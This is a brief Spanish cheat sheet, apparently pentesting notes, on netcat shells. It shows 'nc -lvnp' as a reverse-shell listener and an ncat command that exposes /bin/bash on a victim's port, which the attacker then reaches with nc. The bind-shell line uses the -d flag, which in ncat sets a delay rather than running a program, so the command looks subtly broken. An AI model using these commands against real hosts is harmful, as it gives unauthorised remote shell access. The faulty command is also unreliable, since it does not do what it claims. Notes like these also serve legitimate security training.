Escuchar en un puerto para recibir una conexión


## Uso
```sh title:"Uso de NC para reverse shell"
 nc -lvnp {port}
# puerto de conexion
# -l para escuchar
# -v modo verbose (detalles de la conexion)
# -n para no resolver nombres de dominio
# -p para especificar el puerto
```



```sh title:"Uso de NC para bind shell"
# desde la victima se ofrece la bash por un puerto
 ncat -nlvp {puerto} -d /bin/bash
# puerto de conexion
# -l para escuchar
# -v modo verbose (detalles de la conexion)
# -n para no resolver nombres de dominio
# -p para especificar el puerto


# desde el atacante nos conectamos con
nc {ip victima} {puerto}
```